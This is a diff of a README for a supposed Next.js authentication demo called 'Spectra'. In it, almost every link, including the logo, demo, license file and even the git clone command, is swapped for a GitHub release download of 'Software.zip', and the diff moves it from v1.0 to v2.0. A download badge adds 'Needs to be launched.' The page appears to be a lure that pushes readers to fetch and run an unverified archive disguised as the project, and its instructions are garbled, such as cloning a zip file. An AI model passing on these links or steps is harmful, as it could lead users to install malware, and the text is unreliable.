@@ -1,8 +1,8 @@
-# 🌟 Spectra: https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip Custom Authentication Demo 🌟
+# 🌟 Spectra: https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip Custom Authentication Demo 🌟
 
-![Spectra Logo Image](https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip)
+![Spectra Logo Image](https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip)
 
-Welcome to **Spectra**, a https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip application showcasing custom authentication using sessions, CSRF protection, and email verification. This project is designed to help developers understand and implement secure authentication features in their web applications.
+Welcome to **Spectra**, a https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip application showcasing custom authentication using sessions, CSRF protection, and email verification. This project is designed to help developers understand and implement secure authentication features in their web applications.
 
 ## Features
 - Custom authentication with session management
@@ -22,12 +22,12 @@ Welcome to **Spectra**, a https://github.com/Abdulbasii/spectra/releases/downloa
 ✨ admin-dashboard ✨, ✨ authentication ✨, ✨ csrf-protection ✨, ✨ email-verification ✨, ✨ nextjs ✨, ✨ overwatch-2 ✨, ✨ postgresql ✨, ✨ prisma ✨, ✨ rate-limiting ✨, ✨ redis ✨, ✨ session-management ✨, ✨ tailwindcss ✨, ✨ team-management ✨, ✨ typescript ✨, ✨ upstash ✨, ✨ vercel ✨
 
 ## Demo
-Check out the live demo [here](https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip).
+Check out the live demo [here](https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip).
 
 ## Installation
 To clone this repository and run it locally, use the following command:
 ```
-git clone https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip
+git clone https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip
 cd spectra
 npm install
 npm run dev
@@ -35,14 +35,14 @@ npm run dev
 
 ## Download
 Download the latest version of Spectra as a ZIP file:
-[![Download Spectra](https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip)](https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip)
+[![Download Spectra](https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip)](https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip)
 *Needs to be launched.*
 
 ## Contributing
 We welcome contributions to enhance the features and security of Spectra. Feel free to open issues and pull requests to suggest changes or improvements.
 
 ## License
-This project is licensed under the MIT License - see the [https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip](https://github.com/Abdulbasii/spectra/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip](https://github.com/Abdulbasii/spectra/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
